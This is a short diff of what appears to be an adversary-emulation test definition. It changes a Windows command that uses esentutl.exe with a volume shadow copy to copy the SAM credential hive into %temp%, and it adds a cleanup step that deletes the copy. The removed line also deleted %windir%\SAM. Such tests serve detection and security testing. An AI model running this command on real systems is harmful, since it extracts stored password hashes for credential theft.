@@ -3,5 +3,9 @@
 #Language: cmd
 
 #commands
-del %windir%\SAM & esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %windir%/SAM
+esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
+
+
+#cleanup_commands
+del %temp%\SAM >nul 2>&1
 
